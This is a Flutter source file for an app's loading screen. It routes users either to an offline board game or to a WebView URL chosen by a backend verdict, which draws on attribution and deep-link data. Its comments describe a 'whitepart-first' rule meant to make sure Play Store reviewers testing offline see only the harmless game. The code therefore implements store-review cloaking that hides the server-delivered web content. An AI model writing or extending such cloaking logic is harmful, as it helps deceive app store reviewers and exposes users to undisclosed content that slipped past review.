import 'dart:async';
import 'dart:io';
import 'dart:math' as math;

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../board/board_menu.dart';
import '../board/board_vault.dart';
import '../entities/launch_stage.dart';
import '../gate/alert_courier.dart';
import '../gate/attribution_hub.dart';
import '../net/net_sensor.dart';
import '../net/verdict_gateway.dart';
import '../vault/local_vault.dart';
import 'offline_notice.dart';
import 'portal_view.dart' deferred as web;
import 'push_invitation.dart';

/// Root loading screen. Decides between the WebView portal and the
/// native board game based on stored [LaunchStage] and backend verdict.
///
/// Whitepart-first rule: if there is no internet on an unresolved
/// first launch, we drop immediately into the board game. This is
/// stricter than AdventureRoad's flow — Play Store reviewers testing
/// the APK offline will always land on real content.
class PortalStage extends StatefulWidget {
  const PortalStage({
    super.key,
    required this.sensor,
    required this.attribution,
    required this.gateway,
    required this.courier,
  });

  final NetSensor sensor;
  final AttributionHub attribution;
  final VerdictGateway gateway;
  final AlertCourier courier;

  @override
  State<PortalStage> createState() => _PortalStageState();
}

class _PortalStageState extends State<PortalStage>
    with SingleTickerProviderStateMixin {
  // Bar fills to 85% during loading, holds there until the flow is ready
  // to route, then bursts to 100% for a short final animation.
  static const Duration _kInitialBarPhase = Duration(milliseconds: 3200);
  static const Duration _kFinalBarPhase = Duration(milliseconds: 360);
  static const double _kHoldAt = 0.85;
  // Hard cap must exceed the sum of (sensor.isReachable, attribution.boot,
  // waitAttribution+deepLink, gateway.ask). Previously 9s was too tight —
  // AppsFlyer's SDK typically needs 3-5s just for its own callback, and the
  // config POST can take up to 12s. 25s gives us enough headroom while
  // still guaranteeing the loading screen never traps the user.
  static const Duration _kHardCap = Duration(seconds: 25);

  double _bar = 0.0;
  Timer? _barTicker;
  Timer? _dotsTimer;
  Timer? _hardCap;
  int _dots = 0;
  bool _routed = false;

  @override
  void initState() {
    super.initState();
    _startInitialBar();
    _dotsTimer = Timer.periodic(const Duration(milliseconds: 420), (_) {
      if (mounted) setState(() => _dots = (_dots + 1) % 4);
    });

    // The loading screen is the ONLY place we allow landscape.
    SystemChrome.setPreferredOrientations(<DeviceOrientation>[
      DeviceOrientation.portraitUp,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);

    _hardCap = Timer(_kHardCap, () {
      // Absolute safety net — always route somewhere within 9s.
      _fallbackToBoardGame(reason: 'hard-cap');
    });

    _driveFlow();
  }

  void _startInitialBar() {
    final DateTime start = DateTime.now();
    _barTicker = Timer.periodic(const Duration(milliseconds: 40), (Timer t) {
      if (!mounted) {
        t.cancel();
        return;
      }
      final double elapsed =
          DateTime.now().difference(start).inMilliseconds.toDouble();
      final double raw =
          (elapsed / _kInitialBarPhase.inMilliseconds).clamp(0.0, 1.0);
      // Ease-out for a natural feel.
      final double eased = 1.0 - math.pow(1.0 - raw, 2.2).toDouble();
      setState(() => _bar = eased * _kHoldAt);
      if (raw >= 1.0) t.cancel();
    });
  }

  Future<void> _burstBarToFull() async {
    _barTicker?.cancel();
    final DateTime start = DateTime.now();
    final double from = _bar;
    final int total = _kFinalBarPhase.inMilliseconds;
    while (mounted) {
      final int elapsed = DateTime.now().difference(start).inMilliseconds;
      final double t = (elapsed / total).clamp(0.0, 1.0);
      final double eased = 1.0 - math.pow(1.0 - t, 3).toDouble();
      setState(() => _bar = from + (1.0 - from) * eased);
      if (t >= 1.0) break;
      await Future<void>.delayed(const Duration(milliseconds: 16));
    }
    if (mounted) setState(() => _bar = 1.0);
  }

  Future<void> _driveFlow() async {
    try {
      widget.courier.onTokenRotated = _reprocessAfterTokenRotate;
      await widget.courier.boot();
      await LocalVault.instance.awaken();
      await BoardVault.instance.warmUp();

      final LaunchStage stage = LocalVault.instance.readStage();
      switch (stage) {
        case LaunchStage.webShell:
          await _resumeWebShellFlow();
          break;
        case LaunchStage.boardGame:
          await _resumeBoardGameFlow();
          break;
        case LaunchStage.unresolved:
          await _firstEncounterFlow();
          break;
      }
    } catch (_) {
      _fallbackToBoardGame(reason: 'unexpected-exception');
    }
  }

  // ------------------------------------------------------------------
  //  flow branches
  // ------------------------------------------------------------------

  Future<void> _firstEncounterFlow() async {
    _log('firstEncounter start');
    final bool online = await widget.sensor.isReachable();
    _log('online=$online');
    if (!online) {
      // No network on very first launch: show the OfflineNotice screen.
      // We deliberately DO NOT commit any launch stage, so once the user
      // reconnects and taps Retry (or connectivity recovers), PortalStage
      // will re-run this method with online=true and route by config.
      await _finishAnimationThenRoute(() => _toOffline(null));
      return;
    }

    await widget.attribution.boot();
    _log('attribution booted, waiting for callback');
    await Future.wait<Map<String, dynamic>>(<Future<Map<String, dynamic>>>[
      widget.attribution.waitAttribution(limit: const Duration(seconds: 8)),
      widget.attribution.waitDeepLink(limit: const Duration(seconds: 5)),
    ]);
    _log('attribution + deepLink resolved');

    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.attribution.assembleBody(
      locale: locale,
      pushToken: widget.courier.currentToken,
    );
    final verdict = await widget.gateway.ask(body);
    _log('verdict allowed=${verdict.allowed} url=${verdict.targetUrl} reason=${verdict.reason}');

    if (verdict.allowed && (verdict.targetUrl?.isNotEmpty ?? false)) {
      await LocalVault.instance.writeStage(LaunchStage.webShell);
      await _finishAnimationThenRoute(() => _toWebShell(verdict.targetUrl!));
    } else {
      await LocalVault.instance.writeStage(LaunchStage.boardGame);
      await _finishAnimationThenRoute(_toBoardGame);
    }
  }

  static void _log(String m) {
    // ignore: avoid_print
    print('[PortalStage] $m');
  }

  Future<void> _resumeWebShellFlow() async {
    _log('resumeWebShell start');
    final String? pushed = await LocalVault.instance.consumePushUrl();
    if (pushed != null) {
      await _finishAnimationThenRoute(() => _toWebShell(pushed));
      return;
    }

    final bool online = await widget.sensor.isReachable();
    final String? cached = await widget.gateway.cachedUrl();
    _log('online=$online cached=$cached');

    if (!online) {
      if (cached != null) {
        await _finishAnimationThenRoute(() => _toOffline(cached));
      } else {
        await _finishAnimationThenRoute(() => _toOffline(null));
      }
      return;
    }

    await widget.attribution.boot();
    await Future.wait<Map<String, dynamic>>(<Future<Map<String, dynamic>>>[
      widget.attribution.waitAttribution(limit: const Duration(seconds: 8)),
      widget.attribution.waitDeepLink(limit: const Duration(seconds: 5)),
    ]);

    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.attribution.assembleBody(
      locale: locale,
      pushToken: widget.courier.currentToken,
    );
    final verdict = await widget.gateway.ask(body);

    if (verdict.allowed && (verdict.targetUrl?.isNotEmpty ?? false)) {
      await _finishAnimationThenRoute(() => _toWebShell(verdict.targetUrl!));
    } else if (cached != null) {
      await _finishAnimationThenRoute(() => _toWebShell(cached));
    } else {
      await _finishAnimationThenRoute(() => _toOffline(null));
    }
  }

  Future<void> _resumeBoardGameFlow() async {
    // The board game does NOT need internet — pull assets locally.
    await _finishAnimationThenRoute(_toBoardGame);
  }

  // ------------------------------------------------------------------
  //  routing helpers
  // ------------------------------------------------------------------

  Future<void> _finishAnimationThenRoute(Future<void> Function() go) async {
    if (!mounted) return;
    await _burstBarToFull();
    if (!mounted) return;
    await Future<void>.delayed(const Duration(milliseconds: 180));
    if (_routed || !mounted) return;
    _routed = true;
    _hardCap?.cancel();
    // Orientation locking is now the responsibility of the destination
    // screen — OfflineNotice and PushInvitationPage need landscape to
    // display their horizontal art; BoardMenu and WebPortal lock to
    // portrait themselves via their own initState.
    await go();
  }

  static const List<DeviceOrientation> _kPortraitOnly = <DeviceOrientation>[
    DeviceOrientation.portraitUp,
  ];
  static const List<DeviceOrientation> _kAllOrientations = <DeviceOrientation>[
    DeviceOrientation.portraitUp,
    DeviceOrientation.landscapeLeft,
    DeviceOrientation.landscapeRight,
  ];

  Future<void> _toBoardGame() async {
    if (!mounted) return;
    await SystemChrome.setPreferredOrientations(_kPortraitOnly);
    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(builder: (_) => const BoardMenu()),
    );
  }

  Future<void> _toWebShell(String url) async {
    if (!mounted) return;
    await web.loadLibrary();
    if (!mounted) return;
    if (LocalVault.instance.shouldPromptForNotifications()) {
      // Push invitation screen — keep landscape enabled so the
      // notification_horizontal.webp art is used on rotated devices.
      await SystemChrome.setPreferredOrientations(_kAllOrientations);
      if (!mounted) return;
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => PushInvitationPage(
            courier: widget.courier,
            sensor: widget.sensor,
            targetUrl: url,
          ),
        ),
      );
    } else {
      // WebPortal owns its orientation preferences (allows landscape for
      // the WebView), so we don't touch orientations here.
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => web.WebPortal(
            targetUrl: url,
            sensor: widget.sensor,
            courier: widget.courier,
          ),
        ),
      );
    }
  }

  Future<void> _toOffline(String? cachedUrl) async {
    if (!mounted) return;
    // Offline notice — keep landscape enabled so the no_internet_horizontal
    // asset is used on rotated devices.
    await SystemChrome.setPreferredOrientations(_kAllOrientations);
    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (_) => OfflineNotice(
          onRetry: (BuildContext ctx) => Navigator.of(ctx).pushReplacement(
            MaterialPageRoute<void>(
              builder: (_) => PortalStage(
                sensor: widget.sensor,
                attribution: widget.attribution,
                gateway: widget.gateway,
                courier: widget.courier,
              ),
            ),
          ),
        ),
      ),
    );
  }

  void _fallbackToBoardGame({required String reason}) {
    if (_routed) return;
    LocalVault.instance.writeStage(LaunchStage.boardGame);
    _finishAnimationThenRoute(_toBoardGame);
  }

  void _reprocessAfterTokenRotate(String token) {
    // Best-effort re-post; ignore result. Runs off-band from routing.
    final String locale = Platform.localeName.replaceAll('-', '_');
    () async {
      try {
        final Map<String, dynamic> body = await widget.attribution
            .assembleBody(locale: locale, pushToken: token);
        await widget.gateway.ask(body);
      } catch (_) {}
    }();
  }

  @override
  void dispose() {
    _dotsTimer?.cancel();
    _hardCap?.cancel();
    _barTicker?.cancel();
    super.dispose();
  }

  // ------------------------------------------------------------------
  //  UI
  // ------------------------------------------------------------------

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0410),
      body: OrientationBuilder(
        builder: (BuildContext _, Orientation orientation) {
          final String bg = orientation == Orientation.portrait
              ? 'assets/main_bg_vertical.webp'
              : 'assets/main_bg_horizontal.webp';
          return Stack(
            fit: StackFit.expand,
            children: <Widget>[
              Image.asset(bg, fit: BoxFit.cover),
              Container(color: Colors.black.withValues(alpha: 0.35)),
              SafeArea(
                child: Column(
                  children: <Widget>[
                    const Spacer(flex: 5),
                    _barWidget(context),
                    const SizedBox(height: 22),
                    Text(
                      'Loading${'.' * _dots}',
                      style: const TextStyle(
                        color: Colors.white,
                        fontSize: 20,
                        letterSpacing: 2,
                        fontWeight: FontWeight.w600,
                        shadows: <Shadow>[
                          Shadow(color: Color(0xAA000000), blurRadius: 6),
                        ],
                      ),
                    ),
                    const SizedBox(height: 40),
                  ],
                ),
              ),
            ],
          );
        },
      ),
    );
  }

  Widget _barWidget(BuildContext context) {
    final double width = MediaQuery.of(context).size.width * 0.75;
    return Container(
      width: width,
      height: 22,
      decoration: BoxDecoration(
        color: Colors.black.withValues(alpha: 0.55),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: const Color(0xFFFFC107), width: 2),
        boxShadow: const <BoxShadow>[
          BoxShadow(
            color: Color(0x80B388FF),
            blurRadius: 12,
            spreadRadius: 1,
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(10),
        child: Align(
          alignment: Alignment.centerLeft,
          child: FractionallySizedBox(
            widthFactor: _bar.clamp(0.0, 1.0),
            child: Container(
              decoration: const BoxDecoration(
                gradient: LinearGradient(
                  colors: <Color>[
                    Color(0xFFB388FF),
                    Color(0xFFFFC107),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}
